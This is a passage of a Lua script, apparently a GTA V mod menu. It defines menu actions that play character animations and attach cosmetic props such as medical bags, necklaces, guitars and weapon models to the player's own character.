end)

menu.action(copanims_pics_vroot, "Unknown Male I", {""}, "", function(on_click)
    request_model_load(2325381399)
    attachto(0.0, -0.01, 0.0, players.user(), 0.0, 0.0, 0.0, 2325381399, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Female A", {""}, "", function(on_click)
    request_model_load(2130308972)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 2130308972, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Female B", {""}, "", function(on_click)
    request_model_load(2176835350)
    attachto(0.137, 0.11, -0.03, players.user(), 0.0, 100.0, 80.0, 2176835350, 57005, false, false)
    play_anim("anim@weapons@first_person@aim_idle@generic@melee@switchblade@shared@core", "aim_med_loop", -1)
end)

menu.action(copanims_pics_vroot, "Unknown Female C", {""}, "", function(on_click)
    request_model_load(1259624006)
    attachto(0.0, -0.01, 0.0, players.user(), 0.0, 0.0, 0.0, 1259624006, 28422, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

----- MEDIC ANIMATIONS -----

menu.action(medicanims_vroot, "CPR (Pump Chest)", {""}, "", function(on_click)
    play_animstationary("mini@cpr@char_a@cpr_str", "cpr_pumpchest", -1)
end)

menu.action(medicanims_vroot, "CPR (Kiss Of Life)", {""}, "", function(on_click)
    play_animstationary("mini@cpr@char_a@cpr_str", "cpr_kol", -1)
end)

menu.action(medicanims_vroot, "Examine Victim", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "CODE_HUMAN_MEDIC_KNEEL", 0, true)
end)

menu.action(medicanims_vroot, "First Aid Kit", {""}, "", function(on_click)
    request_model_load(2154892897)
    attachto(0.16, 0.0, -0.04, players.user(), -80.0, -30.0, 90.0, 2154892897, 28422, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(medicanims_vroot, "Medical Bag", {""}, "", function(on_click)
    request_model_load(3792764623)
    attachto(0.36, -0.04, 0.0, players.user(), -90.0, -10.0, 80.0, 3792764623, 6286, false, false)
    play_anim("weapons@first_person@aim_rng@generic@misc@briefcase@", "aim_high_loop", -1)
end)

menu.action(medicanims_vroot, "Notepad ", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "CODE_HUMAN_MEDIC_TIME_OF_DEATH", 0, true)
	request_model_load(463086472)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 463086472, 28422, false, false)
end)

menu.action(medicanims_vroot, "Tend To Victim", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "CODE_HUMAN_MEDIC_TEND_TO_DEAD", 0, true)
end)

menu.action(medicanims_vroot, "Time Of Death", {""}, "", function(on_click)
    request_model_load(1152367621)
    attachto(0.1, 0.02, 0.06, players.user(), 10.0, 0.0, 0.0, 1152367621, 18905, false, false)
    request_model_load(-294844349)
    attachto(0.13, 0.05, -0.01, players.user(), -100.0, 0.0, 20, -294844349, 57005, false, false)
    play_anim("missheistdockssetup1clipboard@base", "base", -1)
end)

----- MISC/WONKY ANIMATIONS -----

menu.action(misc_vroot, "Adjust Neck", {""}, "", function(on_click)
    play_animplayonce("missfbi4", "takeoff_mask", -1)
end)

menu.action(misc_vroot, "Air Glide", {""}, "", function(on_click)
    play_animstationary("swimming@scuba", "dive_glide", -1)
end)

menu.action(misc_vroot, "Air Glide Faster", {""}, "", function(on_click)
    play_animstationary("swimming@scuba", "dive_run", -1)
end)

menu.action(misc_vroot, "Air Stroke", {""}, "", function(on_click)
    play_animstationary("swimming@scuba", "walk", -1)
end)

menu.action(misc_vroot, "Alien Run", {""}, "", function(on_click)
    play_animstationary("move_m@alien", "alien_run", -1)
end)

menu.action(misc_vroot, "Broken Arm", {""}, "", function(on_click)
    play_anim("family_4_mcs_2-9", "s_m_y_doorman_01^1-9", -1)
end)

menu.action(misc_vroot, "Broken Back", {""}, "", function(on_click)
    play_anim("family_4_mcs_2-9", "s_m_y_doorman_01_dual-9", -1)
end)

menu.action(misc_vroot, "Bunny Hop", {""}, "spam it", function(on_click)
    play_animstationary("amb@prop_human_seat_chair@male@elbows_on_knees@react_flee", "flee_forward", -1)
end)

menu.action(misc_vroot, "Elastic Heart", {""}, "", function(on_click)
    play_anim("creatures@hammerhead@move", "idle", -1)
end)

menu.action(misc_vroot, "Flatten Sideways", {""}, "", function(on_click)
    play_anim("mini@biotech@blowtorch_str", "breathing_idle", -1)
end)

menu.action(misc_vroot, "Flatten Up", {""}, "", function(on_click)
    play_anim("anim@mp_point", "additive_walk", -1)
end)

menu.action(misc_vroot, "Flexible Waist", {""}, "", function(on_click)
    play_anim("missfam6ig_7_tattoo", "ig_7_right_ball_draw_lazlow", -1)
end)

menu.action(misc_vroot, "Headless", {""}, "", function(on_click)
    play_anim("sol_5_mcs_2-0", "cs_jimmydisanto_dual-0", -1)
end)

menu.action(misc_vroot, "Mid Air Falling", {""}, "", function(on_click)
    play_animstationary("skydive@freefall", "free_back", -1)
end)

menu.action(misc_vroot, "Naruto Run", {""}, "fast af boi", function(on_click)
    play_anim("swimming@scuba", "dive_glide", -1)
end)

menu.action(misc_vroot, "Reverse Neck", {""}, "", function(on_click)
    play_anim("creatures@dolphin@move", "dead_up", -1)
end)

menu.action(misc_vroot, "Self Launch Into Air", {""}, "wait 7 seconds to launch", function(on_click)
    play_animstationary("missfam5_flying", "falling_to_skydive", -1)
end)

menu.action(misc_vroot, "Stretched Back", {""}, "", function(on_click)
    play_anim("missrappel", "rappel_loop", -1)
end)

menu.action(misc_vroot, "The Thing", {""}, "", function(on_click)
    play_anim("missexile2", "chop_sit_in_baller_ps", -1)
end)

menu.action(misc_vroot, "Tucked Legs", {""}, "", function(on_click)
    play_animstationary("mic_3_int-2", "cs_stevehains_dual-2", -1)
end)

menu.action(misc_vroot, "Usain Bolt", {""}, "", function(on_click)
    play_animstationary("move_characters@ballas@core", "sprint", -1)
end)

----- PROP ANIMATIONS AND ATTACHMENTS -----

--- ACCESSORIES ---

menu.action(accessories_vroot, "Backpack (Blue)", {""}, "", function(on_click)
    request_model_load(1585260068)
    attachto(0.07, -0.15, -0.05, players.user(), 0.0, -90.0, 180.0, 1585260068, 24818, false, false)
end)

menu.action(accessories_vroot, "Backpack (Grey)", {""}, "", function(on_click)
    request_model_load(3092990097)
    attachto(0.07, -0.14, -0.05, players.user(), 0.0, -90.0, 180.0, 3092990097, 24818, false, false)
end)

menu.action(accessories_vroot, "Boxing Glove", {""}, "", function(on_click)
    request_model_load(335898267)
    attachto(-0.13, 0.02, -0.03, players.user(), 60.0, -70.0, 120.0, 335898267, 6286, false, false)
end)

menu.action(accessories_vroot, "Briefcase (Chrome)", {""}, "", function(on_click)
    request_model_load(4139639959)
    attachto(0.12, -0.01, -0.02, players.user(), -80.0, 10.0, 90.0, 4139639959, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(accessories_vroot, "Briefcase (Grey)", {""}, "", function(on_click)
    request_model_load(1037912790)
    attachto(0.28, 0.0, -0.06, players.user(), -80.0, 10.0, 90.0, 1037912790, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(accessories_vroot, "Briefcase (Leather)", {""}, "", function(on_click)
    request_model_load(844634160)
    attachto(0.11, -0.01, -0.02, players.user(), -80.0, 10.0, 90.0, 844634160, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(accessories_vroot, "Dildo XXL", {""}, "", function(on_click)
    request_model_load(1333481871)
    attachto(-0.35, 0.06, -0.01, players.user(), 10.0, -90.0, -90.0, 1333481871, 24817, false, false)
end)

menu.action(accessories_vroot, "Employee Card", {""}, "", function(on_click)
    request_model_load(92191450)
    attachto(0.01, 0.0594, 0.0, players.user(), -180.0, -90.0, -10.0, 92191450, 24818, false, false)
end)

menu.action(accessories_vroot, "Extra Arms", {""}, "", function(on_click)
    request_model_load(3676081503)
    attachto(0.56, -0.0, -0.20, players.user(), -160.0, 30.0, 0.0, 3676081503, 24817, false, false)
	request_model_load(3676081503)
    attachto(0.53, -0.0, 0.30, players.user(), -160.0, -20.0, 0.0, 3676081503, 24817, false, false)
end)

menu.action(accessories_vroot, "Fan", {""}, "", function(on_click)
    request_model_load(1661861648)
    attachto(0.08, 0.03, -0.03, players.user(), -120.0, 0.0, -100.0, 1661861648, 6286, false, false)
    play_anim("mp_move@prostitute@f@french", "idle", -1)
end)

menu.action(accessories_vroot, "Handbag", {""}, "", function(on_click)
    request_model_load(3675909171)
    attachto(0.46, 0.05, -0.09, players.user(), -80.0, -30.0, 90.0, 3675909171, 6286, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(accessories_vroot, "Headphones", {""}, "", function(on_click)
    request_model_load(3646421032)
    attachto(0.28, 0.03, 0.0, players.user(), 0.0, -90.0, 120.0, 3646421032, 24818, false, false)
end)

menu.action(accessories_vroot, "Life Ring", {""}, "", function(on_click)
    request_model_load(1677315747)
    attachto(-0.05, 0.0, 0.0, players.user(), 0.0, 90.0, 0.0, 1677315747, 24817, false, false)
end)

menu.action(accessories_vroot, "Neck Strap Bag", {""}, "", function(on_click)
    request_model_load(3247370732)
    attachto(0.084, 0.103, 0.0, players.user(), 0.0, -90.0, -185.0, 3247370732, 24818, false, false)
end)

menu.action(accessories_vroot, "Neck Strap Camera", {""}, "", function(on_click)
    request_model_load(2477921312)
    attachto(-0.15, 0.288, 0.0, players.user(), 0.0, -90.0, 174.0, 2477921312, 24818, false, false)
end)

menu.action(accessories_vroot, "Ram Skull Mask", {""}, "", function(on_click)
    request_model_load(3271564804)
    attachto(0.042, 0.043, -0.018, players.user(), 0.0, -90.0, 170.0, 3271564804, 31086, false, false)
end)

menu.action(accessories_vroot, "Rose (Mouth)", {""}, "", function(on_click)
    request_model_load(-1048509434)
    attachto(-0.022, 0.113, -0.129, players.user(), 0.0, 0.0, 0.0, -1048509434, 31086, false, false)
end)

menu.action(accessories_vroot, "Safety Glasses", {""}, "", function(on_click)
    request_model_load(2283106578)
    attachto(0.06, 0.048, 0.0, players.user(), 0.0, -90.0, -180.0, 2283106578, 31086, false, false)
end)

menu.action(accessories_vroot, "Shopping Bags", {""}, "", function(on_click)
    request_model_load(605601072)
    attachto(0.05, 0.03, -0.02, players.user(), 4.0, -108.0, -39.0, 605601072, 28422, false, false)
    request_model_load(1907480645)
    attachto(0.03, 0.01, 0.01, players.user(), 180.0, 75.0, -30.0, 1907480645, 60309, false, false)
    play_anim("timetable@tracy@ig_9_11@base", "base_tracy", -1)
end)

menu.action(accessories_vroot, "Ski Mask", {""}, "", function(on_click)
    request_model_load(3083173879)
    attachto(-0.002, 0.026, 0.0, players.user(), 0.0, -90.0, 177.0, 3083173879, 31086, false, false)
end)

menu.action(accessories_vroot, "Tentacles (Back)", {""}, "", function(on_click)
    request_model_load(1293609354)
    attachto(0.02, -0.06, 0.0, players.user(), 0.0, -90.0, 90.0, 1293609354, 24817, false, false)
	request_model_load(862041624)
    attachto(0.02, -0.06, 0.0, players.user(), -20.0, -90.0, 90.0, 862041624, 24817, false, false)
end)

menu.action(accessories_vroot, "UFO Hat", {""}, "", function(on_click)
    request_model_load(3338589916)
    attachto(0.15, -0.05, 0.0, players.user(), 90.0, 130.0, -110.0, 3338589916, 31086, false, false)
end)

menu.action(accessories_vroot, "Umbrella", {""}, "", function(on_click)
    request_model_load(1477930039)
    attachto(0.05, 0.0, -0.01, players.user(), -60.0, -80.0, -30.0, 1477930039, 28422, false, false)
    play_anim("weapons@first_person@aim_idle@generic@melee@small_wpn@nightstick@", "wall_block", -1)
end)

menu.action(accessories_vroot, "Welding Mask", {""}, "", function(on_click)
    request_model_load(2473165924)
    attachto(0.105, 0.015, 0.0, players.user(), 0.0, -90.0, 180.0, 2473165924, 31086, false, false)
end)

menu.action(accessories_vroot, "Wings (Golden)", {""}, "", function(on_click)
    request_model_load(3868884998)
    attachto(-1.15, -0.19, 0.0, players.user(), -180.0, -90.0, 0.0, 3868884998, 24817, false, false)
end)

menu.action(accessories_vroot, "Wings (Silver)", {""}, "", function(on_click)
    request_model_load(4182582635)
    attachto(-1.15, -0.19, 0.0, players.user(), -180.0, -90.0, 0.0, 4182582635, 24817, false, false)
end)

----- NECKLACES -----

menu.action(jewelry_vroot, "Blue Bead Necklace", {""}, "", function(on_click)
    request_model_load(1277485905)
    attachto(0.266, 0.031, 0.0, players.user(), 0.0, 90.0, -130.0, 1277485905, 24818, false, false)
end)

menu.action(jewelry_vroot, "Cross Necklace", {""}, "", function(on_click)
    request_model_load(-1858071425)
    attachto(-0.006, 0.055, 0.0, players.user(), 0.0, -90.0, 168.0, -1858071425, 24818, false, false)
end)

menu.action(jewelry_vroot, "Dragon Necklace", {""}, "", function(on_click)
    request_model_load(3868882105)
    attachto(0.027, 0.054, 0.0, players.user(), 0.0, -90.0, 170.0, 3868882105, 24818, false, false)
end)

menu.action(jewelry_vroot, "Elf Necklace", {""}, "", function(on_click)
    request_model_load(1428248303)
    attachto(-0.01, -0.008, -0.005, players.user(), 0.0, -90.0, 167.0, 1428248303, 24818, false, false)
end)

menu.action(jewelry_vroot, "LS Necklace", {""}, "", function(on_click)
    request_model_load(785421426)
    attachto(0.03, 0.05, -0.005, players.user(), 0.0, -90.0, 175.0, 785421426, 24818, false, false)
end)

menu.action(jewelry_vroot, "Omega Necklace", {""}, "", function(on_click)
    request_model_load(2480906908)
    attachto(-0.001, 0.027, 0.0, players.user(), 0.0, -90.0, 175.0, 2480906908, 24818, false, false)
end)

menu.action(jewelry_vroot, "Ruby Necklace", {""}, "", function(on_click)
    request_model_load(2472404644)
    attachto(-0.05, 0.02, 0.0, players.user(), 0.0, -90.0, -171.0, 2472404644, 24818, false, false)
end)

menu.action(jewelry_vroot, "Sailor Necklace", {""}, "", function(on_click)
    request_model_load(3325271942)
    attachto(0.023, 0.01, -0.0013, players.user(), 0.0, -90.0, 170.0, 3325271942, 24818, false, false)
end)

menu.action(jewelry_vroot, "Star Necklace", {""}, "", function(on_click)
    request_model_load(2859075828)
    attachto(0.012, -0.02, 0.005, players.user(), 0.0, -90.0, -177.0, 2859075828, 24818, false, false)
end)

menu.action(jewelry_vroot, "White Bead Necklace", {""}, "", function(on_click)
    request_model_load(1925649262)
    attachto(0.234, 0.058, 0.0, players.user(), 0.0, 90.0, -125.0, 1925649262, 24818, false, false)
end)

----- GUITARS -----

menu.action(guitars_vroot, "Burgundy Electric Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(3719274865)
    attachto(0.03, -0.121, -0.03, players.user(), 0.0, 110.0, 6.0, 3719274865, 24818, false, false)
end)

menu.action(guitars_vroot, "Burgundy Electric Guitar (Play)", {""}, "", function(on_click)
    request_model_load(3719274865)
    attachto(-0.01, -0.022, 0.0, players.user(), 0.0, 0.0, 0.0, 3719274865, 60309, false, false)
    play_anim("amb@world_human_musician@guitar@male@idle_a", "idle_c", -1)
end)

menu.action(guitars_vroot, "Classic Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(597894660)
    attachto(0.11, -0.15, -0.05, players.user(), 0.0, 103.0, 4.0, 597894660, 24818, false, false)
end)

menu.action(guitars_vroot, "Classic Guitar (Play)", {""}, "", function(on_click)
    request_model_load(597894660)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 597894660, 60309, false, false)
	play_anim("amb@world_human_musician@guitar@male@base", "base", -1)
end)

menu.action(guitars_vroot, "Custom Electric Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(3206382347)
    attachto(0.03, -0.09, -0.03, players.user(), 0.0, 110.0, 6.0, 3206382347, 24818, false, false)
end)

menu.action(guitars_vroot, "Custom Electric Guitar (Play)", {""}, "", function(on_click)
    request_model_load(3206382347)
    attachto(-0.01, -0.022, 0.0, players.user(), 0.0, 0.0, 0.0, 3206382347, 60309, false, false)
    play_anim("amb@world_human_musician@guitar@male@idle_a", "idle_c", -1)
end)

menu.action(guitars_vroot, "Green Electric Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(916292624)
    attachto(0.03, -0.121, -0.03, players.user(), 0.0, 110.0, 6.0, 916292624, 24818, false, false)
end)

menu.action(guitars_vroot, "Green Electric Guitar (Play)", {""}, "", function(on_click)
    request_model_load(916292624)
    attachto(-0.01, -0.022, 0.0, players.user(), 0.0, 0.0, 0.0, 916292624, 60309, false, false)
    play_anim("amb@world_human_musician@guitar@male@idle_a", "idle_c", -1)
end)

menu.action(guitars_vroot, "Tobacco Electric Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(357405112)
    attachto(0.03, -0.11, -0.03, players.user(), 0.0, 110.0, 6.0, 357405112, 24818, false, false)
end)

menu.action(guitars_vroot, "Tobacco Electric Guitar (Play)", {""}, "", function(on_click)
    request_model_load(357405112)
    attachto(-0.01, -0.022, 0.0, players.user(), 0.0, 0.0, 0.0, 357405112, 60309, false, false)
    play_anim("amb@world_human_musician@guitar@male@idle_a", "idle_c", -1)
end)

menu.action(guitars_vroot, "White Electric Guitar (Attach)", {""}, "", function(on_click)
    request_model_load(1653516769)
    attachto(0.03, -0.11, -0.03, players.user(), 0.0, 110.0, 6.0, 1653516769, 24818, false, false)
end)

menu.action(guitars_vroot, "White Electric Guitar (Play)", {""}, "", function(on_click)
    request_model_load(1653516769)
    attachto(-0.01, -0.022, 0.0, players.user(), 0.0, 0.0, 0.0, 1653516769, 60309, false, false)
    play_anim("amb@world_human_musician@guitar@male@idle_a", "idle_c", -1)
end)

menu.action(guitars_vroot, "Guitar Case (Back)", {""}, "", function(on_click)
    request_model_load(3143577534)
    attachto(-0.16, -0.12, 0.0, players.user(), 0.0, 90.0, -85.0, 3143577534, 24818, false, false)
end)

menu.action(guitars_vroot, "Guitar Case (Hand)", {""}, "", function(on_click)
    request_model_load(3143577534)
    attachto(0.26, -0.22, -0.18, players.user(), 20.0, 10.0, 10.0, 3143577534, 57005, false, false)
	play_anim("weapons@melee_1h", "idle", -1)
end)

----- GUNS -----

menu.action(guns_vroot, "Assault Rifle (Luxe)", {""}, "", function(on_click)
    request_model_load(753361113)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 753361113, 24818, false, false)
	request_model_load(1784132283)
    attachto(0.04, -0.127, -0.06, players.user(), 0.0, 20.0, 6.0, 1784132283, 24818, false, false)
end)

menu.action(guns_vroot, "Assault Rifle Mk II", {""}, "", function(on_click)
    request_model_load(1762764713)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1762764713, 24818, false, false)
	request_model_load(1912358573)
    attachto(0.271, -0.103, -0.131, players.user(), 0.0, 20.0, 6.0, 1912358573, 24818, false, false)
    request_model_load(3064717798)
    attachto(0.03, -0.128, -0.06, players.user(), 0.0, 20.0, 6.0, 3064717798, 24818, false, false)
end)

menu.action(guns_vroot, "Assault Shotgun", {""}, "", function(on_click)
    request_model_load(1255410010)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1255410010, 24818, false, false)
	request_model_load(2501307002)
    attachto(0.049, -0.129, -0.097, players.user(), 0.0, 20.0, 6.0, 2501307002, 24818, false, false)
end)

menu.action(guns_vroot, "Ballistic Shield (Hand)", {""}, "", function(on_click)
    request_model_load(1141389967)
    attachto(-0.04, -0.085, 0.01, players.user(), -50.0, -180.0, -5.0, 1141389967, 18905, false, false)
end)

menu.action(guns_vroot, "Ballistic Shield (Back)", {""}, "", function(on_click)
    request_model_load(1141389967)
    attachto(-0.03, -0.15, 0.0, players.user(), 0.0, 90.0, 5.0, 1141389967, 24818, false, false)
end)

menu.action(guns_vroot, "Bullpup Rifle Mk II", {""}, "", function(on_click)
    request_model_load(1415744902)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1415744902, 24818, false, false)
	request_model_load(3757811268)
    attachto(-0.226, -0.157, 0.025, players.user(), 0.0, 20.0, 6.0, 3757811268, 24818, false, false)
	request_model_load(1815685630)
    attachto(0.139, -0.117, -0.093, players.user(), 0.0, 20.0, 6.0, 1815685630, 24818, false, false)
	request_model_load(2924171306)
    attachto(0.2445, -0.11, -0.132, players.user(), 0.0, 20.0, 6.0, 2924171306, 24818, false, false)
	request_model_load(2829113236)
    attachto(-0.014, -0.1341, 0.042, players.user(), 0.0, 20.0, 6.0, 2829113236, 24818, false, false)
end)

menu.action(guns_vroot, "Carbine Rifle Mk II", {""}, "", function(on_click)
    request_model_load(1520780799)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1520780799, 24818, false, false)
	request_model_load(3105469113)
    attachto(-0.047, -0.137, -0.062, players.user(), 0.0, 20.0, 6.0, 3105469113, 24818, false, false)
	request_model_load(783371156)
    attachto(0.019, -0.13, -0.057, players.user(), 0.0, 20.0, 6.0, 783371156, 24818, false, false)
	request_model_load(2829113236)
    attachto(-0.007, -0.132, -0.022, players.user(), 0.0, 20.0, 6.0, 2829113236, 24818, false, false)
	request_model_load(3296361608)
    attachto(0.2792, -0.1023, -0.152, players.user(), 0.0, 20.0, 6.0, 3296361608, 24818, false, false)
end)

menu.action(guns_vroot, "Dual Pistol & Holsters", {""}, "attaches to back of the waist", function(on_click)
    request_model_load(3125389411)
    attachto(-0.0, -0.145, -0.09, players.user(), 0.0, -120.0, -17.0, 3125389411, 11816, false, false)
	request_model_load(403140669)
    attachto(-0.008, -0.139, -0.10, players.user(), 0.0, -30.0, -15.0, 403140669, 11816, false, false)
	request_model_load(3125389411)
    attachto(-0.004, -0.133, 0.12, players.user(), 180.0, 120.0, -17.0, 3125389411, 11816, false, false)
    request_model_load(403140669)
    attachto(0.02, -0.129, 0.136, players.user(), 0.0, 150.0, 165.0, 403140669, 11816, false, false)
end)

menu.action(guns_vroot, "Heavy Rifle", {""}, "", function(on_click)
    request_model_load(1493691718)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1493691718, 24818, false, false)
	request_model_load(4117674611)
    attachto(-0.06, -0.1377, -0.08, players.user(), 0.0, 20.0, 6.0, 4117674611, 24818, false, false)
	request_model_load(2229935454)
    attachto(-0.042, -0.136, 0.0, players.user(), 0.0, 20.0, 6.0, 2229935454, 24818, false, false)
end)

menu.action(guns_vroot, "Heavy Shotgun", {""}, "", function(on_click)
    request_model_load(3085098415)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 3085098415, 24818, false, false)
	request_model_load(3041890424)
    attachto(0.034, -0.138, -0.064, players.user(), 0.0, 20.0, 6.0, 3041890424, 24818, false, false)
end)

menu.action(guns_vroot, "Heavy Sniper Mk II", {""}, "", function(on_click)
    request_model_load(619715967)
    attachto(-0.08, -0.15, -0.046, players.user(), 0.0, 20.0, 6.0, 619715967, 24818, false, false)
	request_model_load(1674250128)
    attachto(0.159, -0.126, -0.09, players.user(), 0.0, 20.0, 6.0, 1674250128, 24818, false, false)
	request_model_load(3735546471)
    attachto(0.037, -0.1333, -0.092, players.user(), 0.0, 20.0, 6.0, 3735546471, 24818, false, false)
	request_model_load(514930793)
    attachto(0.059, -0.1368, -0.007, players.user(), 0.0, 20.0, 6.0, 514930793, 24818, false, false)
	request_model_load(2152330280)
    attachto(0.6241, -0.077, -0.2598, players.user(), 0.0, 20.0, 6.0, 2152330280, 24818, false, false)
end)

menu.action(guns_vroot, "Homing Launcher", {""}, "", function(on_click)
    request_model_load(1901887007)
    attachto(0.1, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1901887007, 24818, false, false)
	request_model_load(3148706974)
    attachto(0.377, -0.11, -0.114, players.user(), -20.0, 0.0, -84.0, 3148706974, 24818, false, false)
end)

menu.action(guns_vroot, "Marksman Rifle Mk II", {""}, "", function(on_click)
    request_model_load(2436666926)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 2436666926, 24818, false, false)
	request_model_load(1061429723)
    attachto(0.033, -0.128, -0.07, players.user(), 0.0, 20.0, 6.0, 1061429723, 24818, false, false)
	request_model_load(902783233)
    attachto(0.069, -0.1242, -0.022, players.user(), 0.0, 20.0, 6.0, 902783233, 24818, false, false)
	request_model_load(2091337486)
    attachto(0.215, -0.11, -0.107, players.user(), 0.0, 20.0, 6.0, 2091337486, 24818, false, false)
	request_model_load(2924171306)
    attachto(0.4593, -0.084, -0.186, players.user(), 0.0, 20.0, 6.0, 2924171306, 24818, false, false)
end)

menu.action(guns_vroot, "Military Rifle", {""}, "", function(on_click)
    request_model_load(635492121)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 635492121, 24818, false, false)
	request_model_load(2950413874)
    attachto(-0.2298, -0.1554, 0.021, players.user(), 0.0, 20.0, 6.0, 2950413874, 24818, false, false)
	request_model_load(2857513750)
    attachto(-0.02, -0.134, 0.021, players.user(), 0.0, 20.0, 6.0, 2857513750, 24818, false, false)
end)

menu.action(guns_vroot, "Minigun", {""}, "", function(on_click)
    request_model_load(422658457)
    attachto(-0.07, -0.2, -0.046, players.user(), 0.0, 20.0, 6.0, 422658457, 24818, false, false)
end)

menu.action(guns_vroot, "Musket", {""}, "", function(on_click)
    request_model_load(1652015642)
    attachto(-0.08, -0.13, -0.046, players.user(), 0.0, 20.0, 6.0, 1652015642, 24818, false, false)
end)

menu.action(guns_vroot, "Precision Rifle", {""}, "", function(on_click)
    request_model_load(3942415509)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 3942415509, 24818, false, false)
	request_model_load(1446647255)
    attachto(0.023, -0.13, -0.096, players.user(), 0.0, 20.0, 6.0, 1446647255, 24818, false, false)
end)

menu.action(guns_vroot, "Pump Shotgun Mk II", {""}, "", function(on_click)
    request_model_load(3194406291)
    attachto(-0.08, -0.135, -0.046, players.user(), 0.0, 20.0, 6.0, 3194406291, 24818, false, false)
end)

menu.action(guns_vroot, "Railgun", {""}, "", function(on_click)
    request_model_load(2418461061)
    attachto(-0.08, -0.136, -0.046, players.user(), 0.0, 20.0, 6.0, 2418461061, 24818, false, false)
	request_model_load(2855736653)
    attachto(0.053, -0.121, -0.086, players.user(), 0.0, 20.0, 6.0, 2855736653, 24818, false, false)
end)

menu.action(guns_vroot, "Riot Shield (Hand)", {""}, "", function(on_click)
    request_model_load(3747585919)
    attachto(-0.04, -0.085, 0.01, players.user(), -50.0, -180.0, -5.0, 3747585919, 18905, false, false)
end)

menu.action(guns_vroot, "Riot Shield (Back)", {""}, "", function(on_click)
    request_model_load(3747585919)
    attachto(-0.03, -0.15, 0.0, players.user(), 0.0, 90.0, 5.0, 3747585919, 24818, false, false)
end)

menu.action(guns_vroot, "RPG", {""}, "", function(on_click)
    request_model_load(4076109223)
    attachto(0.1, -0.13, -0.046, players.user(), 0.0, 20.0, 6.0, 4076109223, 24818, false, false)
	request_model_load(2586970039)
    attachto(0.377, -0.1, -0.114, players.user(), -20.0, 0.0, -84.0, 2586970039, 24818, false, false)
end)

menu.action(guns_vroot, "Service Carbine", {""}, "", function(on_click)
    request_model_load(1668838813)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 1668838813, 24818, false, false)
	request_model_load(3152404481)
    attachto(-0.047, -0.136, -0.06, players.user(), 0.0, 20.0, 6.0, 3152404481, 24818, false, false)
end)

menu.action(guns_vroot, "Sniper Rifle", {""}, "", function(on_click)
    request_model_load(346403307)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 346403307, 24818, false, false)
	request_model_load(2095405400)
    attachto(0.023, -0.13, -0.096, players.user(), 0.0, 20.0, 6.0, 2095405400, 24818, false, false)
	request_model_load(514930793)
    attachto(0.0338, -0.127, -0.0184, players.user(), 0.0, 20.0, 6.0, 514930793, 24818, false, false)
end)

menu.action(guns_vroot, "Special Carbine Mk II", {""}, "", function(on_click)
    request_model_load(2379721761)
    attachto(-0.08, -0.14, -0.046, players.user(), 0.0, 20.0, 6.0, 2379721761, 24818, false, false)
	request_model_load(4117674611)
    attachto(-0.058, -0.1376, -0.059, players.user(), 0.0, 20.0, 6.0, 4117674611, 24818, false, false)
	request_model_load(2351667194)
    attachto(0.17, -0.1138, -0.116, players.user(), 0.0, 20.0, 6.0, 2351667194, 24818, false, false)
	request_model_load(1132722845)
    attachto(0.315, -0.0987, -0.1692, players.user(), 0.0, 20.0, 6.0, 1132722845, 24818, false, false)
end)

menu.action(guns_vroot, "Stun Gun & Holster", {""}, "change Top 2 to 35 pair with police belt", function(on_click)
	request_model_load(3125389411)
    attachto(-0.03, -0.01, 0.212, players.user(), -90.0, 0.0, 90.0, 3125389411, 11816, false, false)
    request_model_load(1609356763)
    attachto(-0.11, -0.015, 0.209, players.user(), -90.0, 1.0, 0.0, 1609356763, 11816, false, false)
end)

----- MELEE -----

menu.action(melee_vroot, "Axe of Fury (Back)", {""}, "", function(on_click)
    request_model_load(2370695324)
    attachto(0.03, -0.13, 0.0, players.user(), 0.0, 120.0, 6.0, 2370695324, 24818, false, false)
end)

menu.action(melee_vroot, "Axe of Fury (Hand)", {""}, "", function(on_click)
    request_model_load(2370695324)
    attachto(0.09, -0.01, -0.02, players.user(), -90.0, 0.0, 0.0, 2370695324, 57005, false, false)
    play_anim("weapons@melee_1h", "idle", -1)
end)

menu.action(melee_vroot, "Axe of Fury (Swing)", {""}, "", function(on_click)
    request_model_load(0x8d4df09c)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 0x8d4df09c, 28422, false, false)
